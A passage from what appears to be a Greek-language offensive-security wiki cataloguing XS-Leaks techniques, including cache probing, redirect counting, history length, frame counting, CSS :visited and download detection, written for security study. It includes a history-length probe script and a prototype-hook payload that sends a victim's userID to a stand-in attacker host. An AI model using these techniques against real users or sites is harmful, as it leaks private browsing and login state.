Σε περίπτωση που το **Origin header** **ανακλάται** στην επικεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη συμπεριφορά προσπαθώντας να **fetch-άρει** τον **πόρο** σε **CORS** mode. Αν **δεν** προκληθεί **σφάλμα**, σημαίνει ότι ανακτήθηκε **σωστά από το web**· αν προκληθεί **σφάλμα**, είναι επειδή αποκτήθηκε **από την cache** (το σφάλμα εμφανίζεται επειδή η cache αποθηκεύει μια απάντηση με CORS header που επιτρέπει την αρχική domain και όχι την domain του επιτιθέμενου).\
Σημειώστε ότι αν το origin δεν ανακλάται αλλά χρησιμοποιείται wildcard (`Access-Control-Allow-Origin: *`) αυτό δεν δουλεύει.

## Readable Attributes Technique

### Fetch Redirect

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Status Code
- **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Summary:** GC και SA επιτρέπουν τον έλεγχο του `response.type` (opaque-redirect) μετά την ολοκλήρωση του redirect.
- **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας ένα request χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλα params, είναι δυνατόν να διαβαστεί το attribute `response.type` και αν είναι ίσο με `opaqueredirect` τότε η απόκριση ήταν redirect.

### COOP

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Επικεφαλίδα
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Summary:** Σελίδες που προστατεύονται από Cross-Origin Opener Policy (COOP) εμποδίζουν την πρόσβαση από cross-origin αλληλεπιδράσεις.
- **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ένας επιτιθέμενος μπορεί να συμπεράνει την παρουσία του header Cross-Origin Opener Policy (COOP) σε μια cross-origin HTTP απάντηση. Το COOP χρησιμοποιείται από web εφαρμογές για να αποτρέψει εξωτερικούς ιστότοπους από τη λήψη αυθαίρετων window references. Η ορατότητα αυτού του header μπορεί να διαγνωστεί προσπαθώντας να αποκτήσει το reference `contentWindow`. Σε σενάρια όπου το COOP εφαρμόζεται υπό όρους, η ιδιότητα `opener` γίνεται ενδεικτική: είναι **undefined** όταν το COOP είναι ενεργό, και **defined** όταν λείπει.

### URL Max Length - Server Side

- **Inclusion Methods**: Fetch API, HTML Elements
- **Detectable Difference**: Status Code / Content
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Summary:** Εντοπίστε διαφορές στις απαντήσεις επειδή το μήκος του redirect URL μπορεί να είναι τόσο μεγάλο που ο server απαντά με σφάλμα και δημιουργείται ένα alert.
- **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Αν ένας server-side redirect χρησιμοποιεί **user input μέσα στην ανακατεύθυνση** και **πρόσθετα δεδομένα**, είναι δυνατόν να ανιχνευθεί αυτή η συμπεριφορά επειδή συνήθως **οι servers έχουν όριο στο μήκος της αίτησης**. Αν τα **user data** είναι αυτό που ισούται με **limit - 1**, και επειδή το **redirect** χρησιμοποιεί αυτά τα δεδομένα και **προσθέτει** κάτι **επιπλέον**, θα προκαλέσει ένα **σφάλμα ανιχνεύσιμο μέσω Error Events**.

Αν με κάποιο τρόπο μπορείτε να θέσετε cookies για έναν χρήστη, μπορείτε επίσης να εκτελέσετε αυτή την επίθεση θέτοντας αρκετά cookies ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) έτσι ώστε με την **αυξημένη απόκριση** της **σωστής απάντησης** να προκληθεί **σφάλμα**. Σε αυτή την περίπτωση, θυμηθείτε ότι αν προκαλέσετε αυτό το request από την ίδια ιστοσελίδα, ένα `<script>` θα στείλει αυτόματα τα cookies (οπότε μπορείτε να ελέγξετε για σφάλματα).\
Ένα παράδειγμα του **cookie bomb + XS-Search** μπορεί να βρεθεί στην Intended solution αυτού του writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Συνήθως απαιτείται `SameSite=None` ή να βρίσκεται στο ίδιο context για αυτό το είδος επίθεσης.

### URL Max Length - Client Side

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Status Code / Content
- **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Summary:** Εντοπίστε διαφορές στις απαντήσεις επειδή το μήκος του redirect URL μπορεί να είναι πολύ μεγάλο για μια αίτηση ώστε να παρατηρηθεί διαφορά.
- **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Σύμφωνα με την [τεκμηρίωση του Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), το μέγιστο μήκος URL του Chrome είναι 2MB.

> Γενικά, η πλατφόρμα web δεν έχει όρια στο μήκος των URLs (αν και το 2^31 είναι ένα κοινό όριο). Το Chrome περιορίζει τα URLs σε μέγιστο μήκος **2MB** για πρακτικούς λόγους και για να αποφευχθούν προβλήματα denial-of-service στην επικοινωνία μεταξύ διεργασιών.

Επομένως, αν το **redirect URL που απαντά είναι μεγαλύτερο σε κάποιο από τα σενάρια**, είναι δυνατόν να το προκαλέσετε να ανακατευθύνει με ένα **URL μεγαλύτερο από 2MB** για να φτάσετε το **όριο μήκους**. Όταν συμβεί αυτό, το Chrome εμφανίζει μια σελίδα **`about:blank#blocked`**.

Η **παρατηρήσιμη διαφορά** είναι ότι αν το **redirect** ολοκληρώθηκε, το `window.origin` προκαλεί **σφάλμα** επειδή ένας cross origin δεν μπορεί να έχει πρόσβαση σε αυτή την πληροφορία. Ωστόσο, αν το **όριο** χτυπήθηκε και η φορτωμένη σελίδα ήταν **`about:blank#blocked`**, το `origin` του παραθύρου παραμένει αυτό του **γονέα**, που είναι **πρόσβαση-πληροφορία**.

Όλα τα επιπλέον δεδομένα που χρειάζονται για να φτάσετε τα **2MB** μπορούν να προστεθούν μέσω ενός **hash** στο αρχικό URL ώστε να **χρησιμοποιηθεί στο redirect**.


{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Inclusion Methods**: Fetch API, Frames
- **Detectable Difference**: Status Code
- **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Summary:** Χρησιμοποιήστε το όριο redirects του browser για να εξακριβώσετε την ύπαρξη URL redirections.
- **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Αν ο **μέγιστος** αριθμός **redirects** που ακολουθεί ο browser είναι **20**, ένας επιτιθέμενος μπορεί να προσπαθήσει να φορτώσει τη σελίδα του με **19 redirects** και τελικά να **στείλει το θύμα** στη σελίδα που ελέγχεται. Αν προκληθεί **σφάλμα**, τότε η σελίδα προσπάθησε να **ανακατευθύνει το θύμα**.

### History Length

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Redirects
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Summary:** Η JavaScript μπορεί να χειριστεί το browser history και αυτό είναι προσπελάσιμο μέσω της ιδιότητας length.
- **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Το **History API** επιτρέπει σε JavaScript να χειρίζεται το ιστορικό του browser, που **αποθηκεύει τις σελίδες που έχει επισκεφθεί ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα length ως μέθοδο ενσωμάτωσης: για να ανιχνεύσει JavaScript και HTML navigation.\
Ελέγχοντας το `history.length`, κάνοντας έναν χρήστη να **πλοηγηθεί** σε μια σελίδα, **επιστρέψει** σε ίδια-origin και ελέγχοντας τη νέα τιμή του **`history.length`**.

### History Length with same URL

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Αν το URL είναι ίδιο με αυτό που μαντέψαμε
- **Summary:** Είναι δυνατόν να μαντέψετε αν η τοποθεσία ενός frame/popup είναι σε ένα συγκεκριμένο URL εκμεταλλευόμενοι το history length.
- **Code Example**: Below

Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει JavaScript για να **ορίσει τη θέση του frame/pop-up σε ένα μαντευμένο URL** και **άμεσα** να το **αλλάξει σε `about:blank`**. Αν το history length αυξήθηκε σημαίνει ότι το URL ήταν σωστό και πρόλαβε να **αυξήσει** επειδή το URL **δεν επαναφορτώνεται αν είναι το ίδιο**. Αν δεν αυξήθηκε σημαίνει ότι **προσπάθησε να φορτώσει το μαντευμένο URL** αλλά επειδή αμέσως μετά φορτώσαμε **`about:blank`**, το **history length** δεν πρόλαβε ποτέ να αυξηθεί κατά το φόρτωμα του μαντευμένου URL.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Μέθοδοι ενσωμάτωσης**: Frames, Pop-ups
- **Ανιχνεύσιμη διαφορά**: Περιεχόμενο σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Σύνοψη:** Αξιολόγηση του πλήθους των στοιχείων iframe με έλεγχο της ιδιότητας `window.length`.
- **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Ο υπολογισμός του **αριθμού των frames σε μία σελίδα** που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στον εντοπισμό της **κατάστασης του χρήστη πάνω σε αυτή τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό frames, ο συνεχής έλεγχος του αριθμού των frames μπορεί να βοηθήσει στον εντοπισμό ενός **πρότυπου** που μπορεί να leak πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι σε chrome, ένα **PDF** μπορεί να **ανιχνευτεί** με **frame counting** επειδή ένα `embed` χρησιμοποιείται εσωτερικά. Υπάρχουν [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιον έλεγχο επί του περιεχομένου όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική μπορεί να είναι ενδιαφέρουσα.

### HTMLElements

- **Μέθοδοι ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη διαφορά**: Περιεχόμενο σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Σύνοψη:** Ανάγνωση της leaked τιμής για να διακρίνεις μεταξύ 2 πιθανών καταστάσεων
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Το leak μέσω HTML στοιχείων είναι θέμα ασφάλειας στο web, ειδικά όταν δημιουργούνται δυναμικά media αρχεία βάσει πληροφοριών χρήστη, ή όταν προστίθενται watermarks που αλλάζουν το μέγεθος του media. Αυτό μπορεί να εκμεταλλευτεί ένας επιτιθέμενος για να διακρίνει μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που εκτίθενται από συγκεκριμένα HTML στοιχεία.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Το στοιχείο αυτό αποκαλύπτει το `duration` και τους χρόνους `buffered` του media, οι οποίοι είναι προσπελάσιμοι μέσω του API του. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Εκθέτει τα `videoHeight` και `videoWidth`. Σε μερικούς browsers υπάρχουν επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount` που προσφέρουν πιο λεπτομερείς πληροφορίες για το περιεχόμενο του media. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες για την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένου του `totalVideoFrames`, που μπορεί να υποδείξει την ποσότητα των δεδομένων βίντεο που επεξεργάστηκαν. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Διαρρέει το `height` και `width` μιας εικόνας. Ωστόσο, αν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η συνάρτηση `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Μέθοδοι ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη διαφορά**: Περιεχόμενο σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Σύνοψη:** Εντόπιση μεταβολών στο styling του ιστότοπου που συσχετίζονται με την κατάσταση ή το status του χρήστη.
- **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Οι web εφαρμογές μπορεί να αλλάζουν το styling του ιστότοπου ανάλογα με το status του χρήστη. Cross-origin CSS αρχεία μπορούν να ενσωματωθούν στη σελίδα του επιτιθέμενου με το HTML `link` στοιχείο, και οι κανόνες θα εφαρμοστούν στη σελίδα του επιτιθέμενου. Αν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να ανιχνεύσει αυτές τις διαφορές ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική leak, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να διαβάσει ιδιότητες CSS ενός συγκεκριμένου HTML στοιχείου. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες CSS ιδιότητες αν είναι γνωστό το επηρεαζόμενο στοιχείο και το όνομα της ιδιότητας.

### CSS History

- **Μέθοδοι ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη διαφορά**: Περιεχόμενο σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Σύνοψη:** Εντοπισμός αν το style `:visited` εφαρμόζεται σε ένα URL, υποδεικνύοντας ότι έχει ήδη επισκεφθεί
- **Παράδειγμα κώδικα**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!TIP]
> Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί σε headless Chrome.

Ο επιλεκτής CSS `:visited` χρησιμοποιείται για να στυλιζάρει URLs διαφορετικά αν έχουν ήδη επισκεφθεί από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` μπορούσε να χρησιμοποιηθεί για να εντοπιστούν αυτές οι διαφορές στυλ. Ωστόσο, οι σύγχρονοι browsers έχουν εφαρμόσει μέτρα ασφαλείας για να αποτρέψουν αυτή τη μέθοδο από το να αποκαλύπτει την κατάσταση ενός συνδέσμου. Αυτά τα μέτρα περιλαμβάνουν την επιστροφή του υπολογισμένου στυλ σαν να ήταν πάντα επισκεφθείς και τον περιορισμό των στυλ που μπορούν να εφαρμοστούν με τον επιλεκτή `:visited`.

Παρά αυτούς τους περιορισμούς, είναι δυνατό να εξαχθεί η κατάσταση επισκέψεων ενός συνδέσμου έμμεσα. Μια τεχνική περιλαμβάνει να παραπλανήσει τον χρήστη να αλληλεπιδράσει με μια περιοχή επηρεασμένη από CSS, συγκεκριμένα χρησιμοποιώντας την ιδιότητα `mix-blend-mode`. Αυτή η ιδιότητα επιτρέπει το blending των στοιχείων με το background τους, ενδέχεται να αποκαλύψει την κατάσταση `visited` βασισμένη στην αλληλεπίδραση του χρήστη.

Επιπλέον, η ανίχνευση μπορεί να επιτευχθεί χωρίς αλληλεπίδραση χρήστη εκμεταλλευόμενοι τους χρόνους rendering των links. Επειδή οι browsers μπορεί να αποδίδουν visited και unvisited links διαφορετικά, αυτό μπορεί να εισαγάγει μια μετρήσιμη διαφορά χρόνου στο rendering. Ένα PoC αναφέρθηκε σε ένα bug report του Chromium, που χρησιμοποιεί πολλαπλούς συνδέσμους για να ενισχύσει τη διαφορά χρόνου, κάνοντας έτσι την κατάσταση visited ανιχνεύσιμη μέσω ανάλυσης χρόνου.

Για περισσότερες λεπτομέρειες σχετικά με αυτές τις ιδιότητες και μεθόδους, δείτε τις σελίδες τεκμηρίωσής τους:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Μέθοδοι ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Σύνοψη:** Σε Google Chrome, εμφανίζεται μια αποκλειστική σελίδα σφάλματος όταν μια σελίδα μπλοκάρεται από το να ενσωματωθεί σε cross-origin site λόγω περιορισμών X-Frame-Options.
- **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στον Chrome, αν μια σελίδα με το header `X-Frame-Options` ορισμένο σε "deny" ή "same-origin" ενσωματωθεί ως object, εμφανίζεται μια σελίδα σφάλματος. Ο Chrome επιστρέφει μοναδικά ένα κενό document object (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του object, σε αντίθεση με τα iframes ή άλλους browsers. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτόν τον εντοπισμό του κενoύ εγγράφου, ενδεχομένως αποκαλύπτοντας πληροφορίες για την κατάσταση του χρήστη, ειδικά αν οι προγραμματιστές εφαρμόζουν με ασυνέπεια το header X-Frame-Options, συχνά παραβλέποντας τις σελίδες σφάλματος. Η ενημέρωση και η συνεπής εφαρμογή των security headers είναι κρίσιμες για την πρόληψη τέτοιων leaks.

### Download Detection

- **Μέθοδοι ενσωμάτωσης**: Frames, Pop-ups
- **Ανιχνεύσιμη διαφορά**: Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει κατεβάσματα αρχείων αξιοποιώντας iframes; η συνεχιζόμενη προσβασιμότητα του iframe συνεπάγεται επιτυχή λήψη αρχείου.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Το header `Content-Disposition`, ειδικά `Content-Disposition: attachment`, υποδεικνύει στον browser να κατεβάσει το περιεχόμενο αντί να το εμφανίσει inline. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνευθεί αν ένας χρήστης έχει πρόσβαση σε μια σελίδα που προκαλεί λήψη αρχείου. Σε browsers βασισμένους σε Chromium, υπάρχουν μερικές τεχνικές για να ανιχνεύσεις αυτή τη συμπεριφορά λήψης:

1. **Παρακολούθηση download bar**:
- Όταν ένα αρχείο κατεβαίνει σε Chromium-based browsers, εμφανίζεται μια download bar στο κάτω μέρος του παραθύρου του browser.
- Παρακολουθώντας αλλαγές στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της download bar, υποδεικνύοντας ότι ξεκίνησε λήψη.
2. **Download navigation με iframes**:
- Όταν μια σελίδα ενεργοποιεί λήψη αρχείου χρησιμοποιώντας το header `Content-Disposition: attachment`, αυτό δεν προκαλεί event πλοήγησης.
- Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας events πλοήγησης, είναι δυνατό να ελεγχθεί αν το content-disposition προκαλεί λήψη αρχείου (καμία πλοήγηση) ή όχι.
3. **Download navigation χωρίς iframes**:
- Παρόμοια με την τεχνική iframe, αυτή η μέθοδος χρησιμοποιεί `window.open` αντί για iframe.
- Η παρακολούθηση των events πλοήγησης στο νέο ανοικτό παράθυρο μπορεί να αποκαλύψει αν ενεργοποιήθηκε λήψη αρχείου (καμία πλοήγηση) ή αν το περιεχόμενο εμφανίστηκε inline (πλοήγηση συμβαίνει).

Σε σενάρια όπου μόνο συνδεδεμένοι χρήστες μπορούν να προκαλέσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να εξαχθεί έμμεσα η κατάσταση αυθεντικοποίησης του χρήστη βάσει της απόκρισης του browser στο αίτημα λήψης.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Μέθοδοι ενσωμάτωσης**: Pop-ups
- **Ανιχνεύσιμη διαφορά**: Timing
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Σύνοψη:** Ένας επιτιθέμενος μπορεί να διακρίνει κατεβάσματα αρχείων αξιοποιώντας iframes; η συνεχιζόμενη προσβασιμότητα του iframe συνεπάγεται επιτυχή λήψη αρχείου.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Αυτός είναι ο λόγος που αυτή η τεχνική είναι ενδιαφέρουσα: ο Chrome πλέον έχει **cache partitioning**, και το cache key της νεοανοικτής σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτήν, το cache key θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **cache key είναι διαφορετικό**, οπότε το cache δεν μπορεί να κοινοποιηθεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Αν ένας ιστότοπος `example.com` περιλαμβάνει έναν πόρο από `*.example.com/resource` τότε αυτός ο πόρος θα έχει το **ίδιο caching key** σαν να ζητήθηκε άμεσα μέσω top-level navigation. Αυτό συμβαίνει επειδή το caching key αποτελείται από το top-level _eTLD+1_ και frame _eTLD+1_.

Επειδή η πρόσβαση στο cache είναι ταχύτερη από τη φόρτωση ενός πόρου, είναι δυνατό να δοκιμάσεις να αλλάξεις τη διεύθυνση μιας σελίδας και να την ακυρώσεις μετά από 20ms (για παράδειγμα). Αν η προέλευση άλλαξε μετά το stop, σημαίνει ότι ο πόρος ήταν cached.\
Εναλλακτικά μπορείς απλά να **στείλεις κάποιο fetch στη δυνητικά cached σελίδα και να μετρήσεις τον χρόνο που παίρνει**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Μέθοδοι ενσωμάτωσης**: Fetch API
- **Ανιχνεύσιμη διαφορά**: Redirects
- **Περισσότερες πληροφορίες**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Σύνοψη:** Είναι δυνατό να διαπιστωθεί αν μια απόκριση σε αίτημα fetch είναι redirect
- **Παράδειγμα κώδικα**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Μέθοδοι ενσωμάτωσης**: Fetch API
- **Ανιχνεύσιμη διαφορά**: Timing
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Σύνοψη:** Είναι δυνατό να προσπαθήσεις να φορτώσεις έναν πόρο και να τον abort πριν ολοκληρωθεί η φόρτωση. Ανάλογα με το αν προκύψει σφάλμα, ο πόρος ήταν ή δεν ήταν cached.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Χρησιμοποίησε _**fetch**_ και _**setTimeout**_ με έναν **AbortController** για να ανιχνεύσεις αν ο **πόρος είναι cached** και για να αποβάλεις έναν συγκεκριμένο πόρο από το cache του browser. Επιπλέον, η διαδικασία γίνεται χωρίς να αποθηκευτεί νέο περιεχόμενο στο cache.

### Script Pollution

- **Μέθοδοι ενσωμάτωσης**: HTML Elements (script)
- **Ανιχνεύσιμη διαφορά**: Περιεχόμενο σελίδας
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Σύνοψη:** Είναι δυνατό να **overwrite built-in functions** και να διαβάσεις τα arguments τους ακόμα και από **cross-origin script** (που δεν μπορούν να διαβαστούν άμεσα), αυτό μπορεί να leak πολύτιμες πληροφορίες.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

#### Prototype hooks to exfiltrate module-scoped data

Pre-define `Function.prototype.default` and `Function.prototype.__esModule = 1` before loading a module so its `default` export calls your hook (e.g., receives `{userID: ...}`), letting you read module-scoped values without timing or brute force.
```html
<script>
Function.prototype.default=(e)=>{if(typeof e.userID==="string")fetch("//attacker.test/?id="+e.userID)}
Function.prototype.__esModule=1
</script>
<script src="https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"></script>
```
Το ίδιο το αίτημα γίνεται επίσης ένα login-state oracle αν το script φορτώνει μόνο για επαληθευμένους χρήστες.

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Μετρήστε τον χρόνο εκτέλεσης μιας web σελίδας χρησιμοποιώντας service workers.
- **Code Example**:

